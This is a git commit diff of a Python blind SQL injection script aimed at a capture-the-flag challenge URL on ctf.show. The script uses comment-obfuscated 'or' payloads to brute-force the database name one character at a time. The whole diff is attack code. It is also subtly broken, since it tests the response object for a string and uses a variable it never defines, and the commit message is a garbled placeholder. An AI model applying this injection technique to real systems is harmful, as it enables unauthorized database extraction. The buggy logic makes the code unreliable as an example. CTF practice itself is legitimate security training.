f3a7ea1f22e49319ebe415dbe77a80b9eec2f8ae
whb54012 <1226844928@qq.com>
2026-07-21 11:06:13 +0000

    自动提交：更新 ${2026/7/21 19:06ilenPM6e}

--- python/盲注脚本.py
+++ python/盲注脚本.py
@@ -1,6 +1,12 @@
 import requests
-url = "https://b14e78f6-4073-4fa1-ad67-8d5d1ed1deab.challenge.ctf.show/index.php?id="
-for num1 in (1,20):
-    for num2 in(65,123):
+url = "https://b14e78f6-4073-4fa1-ad67-8d5d1ed1deab.challenge.ctf.show/index.php?id=/**/or/**/"
+for num1 in range(1,20):
+    for num2 in range (65,123):
         data = "ascii(substr(database() from %d for 1))=%d" % (num1, num2)
-result = requests.get(url + data)
+        result = requests.get(url + data)
+        if "IF" in result:
+            word+=chr(num2)
+            print(word)
+        else:
+            pass
+
